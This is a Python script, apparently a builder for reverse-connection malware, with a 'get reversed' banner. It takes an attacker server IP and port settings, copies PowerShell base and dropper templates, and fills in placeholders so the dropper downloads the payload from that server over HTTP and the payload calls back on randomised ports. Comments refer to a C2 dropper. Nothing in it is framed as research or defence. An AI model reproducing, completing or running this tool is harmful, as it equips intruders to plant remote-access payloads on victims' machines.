import os
print("""


  ▄▀  ▄███▄     ▄▄▄▄▀     █▄▄▄▄ ▄███▄      ▄   ▄███▄   █▄▄▄▄   ▄▄▄▄▄   ▄███▄   ██▄   
▄▀    █▀   ▀ ▀▀▀ █        █  ▄▀ █▀   ▀      █  █▀   ▀  █  ▄▀  █     ▀▄ █▀   ▀  █  █  
█ ▀▄  ██▄▄       █        █▀▀▌  ██▄▄   █     █ ██▄▄    █▀▀▌ ▄  ▀▀▀▀▄   ██▄▄    █   █ 
█   █ █▄   ▄▀   █         █  █  █▄   ▄▀ █    █ █▄   ▄▀ █  █  ▀▄▄▄▄▀    █▄   ▄▀ █  █  
 ███  ▀███▀    ▀            █   ▀███▀    █  █  ▀███▀     █             ▀███▀   ███▀  
                           ▀              █▐            ▀                            
                                          ▐                                          



	""")
		
IP = str(input("Introduce the server IP: "))
PORTS_list = []

num_portsU = int(input("Introduce the amount of ports you want to use (for the moment it just works with 2): "))
for column in range(num_portsU):
	portsP = int(input(f"\nIntroduce the port num {column}: "))
	PORTS_list.append(portsP)

range_ports = int(input("\nIntroduce the range of the ports (ex: 2 -> 2000..2002): "))


dir_ouput_name = "Output"

#Names to modify dropper_template: **NameExec(between ""), **ServerIP("http format")
#Names to modify base_tempalte: **PORTS(2000, 4000), **NUM_PORTS(Get-Random -Maximum 2), **RANGE ((Get-Random -Maximum 5))
#Implement the droopper function LITE_C2 uses

#function that creates a directory where the output will be placed, you can specify the name you want
def directory():
    pathing = os.environ
    if os.path.isdir(f'{pathing["PWD"]}/{dir_ouput_name}') != True:
        os.mkdir(f'{pathing["PWD"]}/{dir_ouput_name}')
    path_Mw = f'{pathing["PWD"]}/{dir_ouput_name}/'
    return path_Mw

#function that copies a template and names de copy
def copyFile():
	template_to_copy1 = "base_template.ps1" #change these names with the ones you have
	template_to_copy2 = "dropper_template.ps1" 
	#it is yet to be determined if the program name must be introduced by the user or generated automatically
	name = str(input("Introduce the program name (anything you want): "))
	os.system(f"cp {template_to_copy1} {directory()}{name}.ps1")
	os.system(f"cp {template_to_copy2} {directory()}{name}_dropper.ps1")
	return (name)

program_name = copyFile() #also ask the user for the desired name for the program

#function that modifies the copied template with the parameters introduced previously
def build(base_filef, dropper_filef, portsf, range_portsf, num_portsf, program_namef, IPf):
	num_portsf = (f"Get-Random -Maximum {num_portsf}")
	range_portsf = (f"(Get-Random -Maximum {range_portsf})")
	program_namef = (f"{program_namef}")
	IPf1 = (f'"{IPf}"')

	with open (base_filef, "r") as program:
		content = program.read()
		content = content.replace("**IP_ATC", IPf1)
		content = content.replace("**PORTS", f"{portsf[0]}, {portsf[1]}") #TODO: 
		content = content.replace("**NUM_PORTS", num_portsf)
		content = content.replace("**RANGE", range_portsf)
		program.close()

	with open (base_filef, "w") as program:
		program.write(content)
		program.close()

	IPf = (f"http://{IPf}/")

	with open (dropper_filef, "r") as dropper:
		content = dropper.read()
		content = content.replace("**NameExec", program_namef)
		content = content.replace("**ServerIP", IPf)
		dropper.close()

	with open (dropper_filef, "w") as dropper:
		dropper.write(content)
		dropper.close()

build(f"{directory()}{program_name}.ps1", f"{directory()}{program_name}_dropper.ps1", PORTS_list, range_ports, num_portsU, program_name, IP)